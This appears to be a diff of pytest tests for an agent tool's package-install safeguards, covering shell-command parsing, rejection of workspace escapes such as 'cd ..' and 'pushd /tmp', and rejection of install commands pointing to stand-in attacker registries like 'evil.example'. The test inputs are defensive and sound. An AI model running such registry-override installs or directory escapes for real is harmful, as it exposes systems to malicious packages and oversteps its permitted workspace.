@@ -6,12 +6,14 @@ import pytest
 
 from agentcore.tools.builtin.package_install import (
     apply_working_directory,
+    command_payload_argvs,
     install_prefix_allowed,
     is_install_shaped_argv,
     is_safe_relpath,
     registry_pin_env,
     reject_registry_override_argv,
-    reject_shell_chain_command,
+    reject_registry_override_in_command,
+    reject_workspace_cd,
     resolve_install_argv,
     validate_install_argv,
 )
@@ -63,11 +65,39 @@ def test_install_shaped_rejected(argv: list[str]):
     assert validate_install_argv(argv) is not None or not install_prefix_allowed(argv)
 
 
-def test_reject_shell_chain():
-    assert reject_shell_chain_command("cd foo && npm install") is not None
-    assert reject_shell_chain_command("cd foo && pip install -r requirements.txt") is not None
-    assert reject_shell_chain_command("npm install") is None
-    assert reject_shell_chain_command("uv sync") is None
+def test_shell_segments_allow_cd_pipe_and_redirect():
+    assert command_payload_argvs("cd foo && npm install") == [["npm", "install"]]
+    assert command_payload_argvs("cd foo && pip install -r requirements.txt") == [
+        ["pip", "install", "-r", "requirements.txt"]
+    ]
+    assert command_payload_argvs("npm install") == [["npm", "install"]]
+    assert command_payload_argvs("uv sync") == [["uv", "sync"]]
+    assert command_payload_argvs("pnpm add vitest | tail") == [["pnpm", "add", "vitest"]]
+    assert command_payload_argvs("pnpm add lodash 2>&1") == [["pnpm", "add", "lodash"]]
+    assert command_payload_argvs("pnpm install > log.txt") == [["pnpm", "install"]]
+    assert command_payload_argvs("pnpm add foo@>=1.0.0") == [["pnpm", "add", "foo@>=1.0.0"]]
+    assert command_payload_argvs("pnpm test | grep FAIL") == [["pnpm", "test"]]
+    assert command_payload_argvs("export FOO=1 && pnpm test") == [["pnpm", "test"]]
+    assert command_payload_argvs("CI=1 pnpm test") == [["pnpm", "test"]]
+    assert command_payload_argvs("pnpm test && echo hi") == [
+        ["pnpm", "test"],
+        ["echo", "hi"],
+    ]
+
+
+def test_workspace_cd_and_registry_in_command():
+    assert reject_workspace_cd("cd foo && npm install") is None
+    assert reject_workspace_cd("cd ..") is not None
+    assert reject_workspace_cd("cd .. && pnpm test") is not None
+    assert reject_workspace_cd("cd /") is not None
+    assert reject_workspace_cd("cd ~") is not None
+    assert reject_workspace_cd("pushd /tmp") is not None
+    assert reject_workspace_cd("pnpm test") is None
+    assert reject_registry_override_in_command(
+        "npm install --registry https://evil.example/"
+    )
+    assert reject_registry_override_in_command("uv sync --index-url https://evil/")
+    assert reject_registry_override_in_command("pnpm add lodash") is None
 
 
 def test_reject_registry_override():
